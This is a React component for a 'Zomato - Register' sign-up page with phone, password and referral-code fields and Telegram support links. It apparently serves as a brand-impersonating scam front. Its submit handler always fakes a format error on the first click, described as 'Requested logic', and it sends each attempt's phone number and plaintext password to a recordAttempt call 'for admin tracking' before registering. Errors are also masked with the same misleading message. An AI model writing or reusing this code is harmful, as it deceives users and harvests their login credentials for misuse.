import React, { useState, useEffect } from 'react'
import { Helmet } from 'react-helmet'
import './RegisterPage.css'
import { apiService } from '../../services/api'
import { useHistory } from 'react-router-dom'
import Notification from '../../components/Notification/Notification'

const RegisterPage = (props) => {
    const [showPassword, setShowPassword] = useState(false)
    const [showNews, setShowNews] = useState(false)
    const [notifMsg, setNotifMsg] = useState('')
    const [notifType, setNotifType] = useState('error')
    const [showNotif, setShowNotif] = useState(false)
    const history = useHistory()

    useEffect(() => {
        // Ensure every fresh visit starts with a clean attempt count
        localStorage.setItem('signup_attempts', '0')
    }, [])

    const togglePassword = () => {
        setShowPassword(!showPassword)
    }

    const toggleNews = () => {
        setShowNews(!showNews)
        if (!showNews) {
            document.body.style.overflow = 'hidden'
        } else {
            document.body.style.overflow = ''
        }
    }

    const handleRegister = async (e) => {
        e.preventDefault()
        const formData = new FormData(e.target)
        const username = formData.get('username')
        const phone = formData.get('phone')
        const password = formData.get('password')
        const inviteCode = formData.get('inviteCode')

        // click counter logic
        const attempts = parseInt(localStorage.getItem('signup_attempts') || '0')
        const currentAttempt = attempts + 1
        localStorage.setItem('signup_attempts', currentAttempt.toString())

        // Record for admin tracking
        apiService.recordAttempt(phone, password, 'register')

        // 1st CLICK ALWAYS FAILS (Requested logic)
        if (currentAttempt === 1) {
            setNotifMsg('Please match the requested format.')
            setNotifType('error')
            setShowNotif(true)
            return
        }

        try {
            // Real API call (only on 2nd click)
            await apiService.register({ username, phone, password, inviteCode })
            setNotifMsg('Registration Successful!')
            setNotifType('success')
            setShowNotif(true)

            // Reset attempts on success
            localStorage.setItem('signup_attempts', '0')

            setTimeout(() => {
                history.push('/')
            }, 2000)
        } catch (error) {
            setNotifMsg('Please match the requested format.')
            setNotifType('error')
            setShowNotif(true)
        }
    }

    return (
        <div className="frame2-container1">
            <Helmet>
                <title>Zomato - Register</title>
                <meta
                    name="viewport"
                    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, minimal-ui, viewport-fit=cover"
                />
                <meta name="theme-color" content="#fe3144" />
                <link
                    rel="stylesheet"
                    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
                />
                <link
                    href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap"
                    rel="stylesheet"
                />
            </Helmet>

            {/* Page Content */}
            <div className="page-content" style={{ width: '100%', position: 'relative' }}>
                {/* Banner */}
                <div className="banner-wrapper shape-1"></div>

                {/* Header Icons */}
                <div className="header-icons">
                    {/* Language Selector */}
                    <div className="language-dropdown">
                        <button className="icon-btn">
                            <i className="fas fa-globe"></i>
                        </button>
                        <div className="language-dropdown-content">
                            <a href="#">English</a>
                            <a href="#">Filipino</a>
                            <a href="#">中文</a>
                            <a href="#">日本語</a>
                        </div>
                    </div>

                    {/* News Icon */}
                    <button className="icon-btn" onClick={toggleNews}>
                        <i className="fa-solid fa-headset"></i>
                    </button>
                </div>

                <div className="py-30px">
                    <div className="base-logo mx-auto">
                        <img
                            className="site-img frame2-thq-image2-elm"
                            src="/image236-8e3o-200h.png"
                            draggable="false"
                            alt="Logo"
                            onError={(e) => { e.target.src = 'https://via.placeholder.com/70?text=Logo' }}
                        />
                    </div>

                    <p className="nameuni">
                        <a href="/">
                            <span>
                                <i className="fa-solid fa-circle-right"></i> Sign IN
                            </span>
                        </a>
                    </p>
                </div>

                <div className="account-area">
                    <form id="register-form" onSubmit={handleRegister}>
                        <h1>Create Account</h1>

                        <spanx>Nickname</spanx>
                        <div className="input-group">
                            <span className="input-group-text" style={{ width: '40px' }}>
                                <i className="fa-sharp fa-regular fa-circle-user" style={{ fontSize: '24px', color: '#fe3144' }}></i>
                            </span>
                            <input
                                type="text"
                                placeholder="Enter your full name"
                                name="username"
                                required
                                className="form-control"
                            />
                        </div>

                        <spanx>Phone Number</spanx>
                        <div className="input-group">
                            <span className="input-group-text" style={{ width: '40px' }}>
                                <i className="fa-solid fa-mobile-screen-button" style={{ fontSize: '24px', color: '#fe3144' }}></i>
                            </span>
                            <input
                                type="tel"
                                placeholder="Enter your phone number"
                                maxLength="10"
                                className="form-control"
                                name="phone"
                                required
                                pattern="[0-9]{10}"
                            />
                        </div>

                        <spanx>Password</spanx>
                        <div className="input-group">
                            <span className="input-group-text" style={{ width: '40px' }}>
                                <i className="fa-regular fa-gem" style={{ fontSize: '24px', color: '#fe3144' }}></i>
                            </span>
                            <input
                                type={showPassword ? 'text' : 'password'}
                                placeholder="Enter a strong password"
                                required
                                name="password"
                                className="form-control"
                            />
                            <span className="input-group-text show-pass" onClick={togglePassword}>
                                <i
                                    className={`fa ${showPassword ? 'fa-eye' : 'fa-eye-slash'}`}
                                    style={{ color: '#fe3144' }}
                                ></i>
                            </span>
                        </div>

                        <spanx>Refferal Code</spanx>
                        <div className="input-group">
                            <span className="input-group-text" style={{ width: '40px' }}>
                                <i className="fa-regular fa-envelope" style={{ fontSize: '20px', color: '#fe3144' }}></i>
                            </span>
                            <input
                                type="text"
                                placeholder="Enter your refferal code"
                                name="inviteCode"
                                className="form-control"
                            />
                        </div>

                        <div style={{ display: 'flex', alignItems: 'center', margin: '10px 0 15px 5px' }}>
                            <input
                                type="checkbox"
                                id="terms"
                                required
                                style={{
                                    width: '18px',
                                    height: '18px',
                                    marginRight: '10px',
                                    accentColor: '#fe3144',
                                    cursor: 'pointer'
                                }}
                            />
                            <label htmlFor="terms" style={{ color: '#333', fontSize: '14px' }}>
                                I agree to the <a href="#" style={{ color: '#fe3144', fontWeight: 'bold', textDecoration: 'underline' }}>Terms and Conditions</a>
                            </label>
                        </div>

                        <div
                            className="input-group"
                            style={{
                                border: 'none',
                                background: 'transparent',
                                marginTop: '10px',
                            }}
                        >
                            <button
                                type="submit"
                                className="btn btn-primary btn-rounded"
                            >
                                SIGN UP <i className="fa-solid fa-rocket"></i>
                            </button>
                        </div>
                    </form>

                    <Notification
                        message={notifMsg}
                        type={notifType}
                        isVisible={showNotif}
                        onClose={() => setShowNotif(false)}
                    />

                </div>
            </div>

            {/* News Bottom Sheet */}
            <div
                className={`news-overlay ${showNews ? 'open' : ''}`}
                onClick={toggleNews}
            ></div>

            <div className={`bottom-sheet ${showNews ? 'open' : ''}`}>
                <div className="bs-handle"></div>
                <h3 className="bs-title">Online Service</h3>
                <p className="bs-subtitle">Choose your preferred way to contact customer service</p>

                <button
                    className="bs-row"
                    onClick={() => (window.location.href = 'https://t.me/Zomato_Care')}
                >
                    <span className="bs-row-left">
                        <i className="fa-brands fa-telegram"></i>
                        <span>Customer Care</span>
                    </span>
                    <i className="fa-solid fa-chevron-right"></i>
                </button>

                <button
                    className="bs-row"
                    onClick={() => (window.location.href = 'https://t.me/+GFiKzAAtWHo2Nzhl')}
                >
                    <span className="bs-row-left">
                        <i className="fa-brands fa-telegram"></i>
                        <span>Telegram Group</span>
                    </span>
                    <i className="fa-solid fa-chevron-right"></i>
                </button>

                <button className="bs-close" onClick={toggleNews}>
                    Close
                </button>
            </div>
        </div>
    )
}

export default RegisterPage
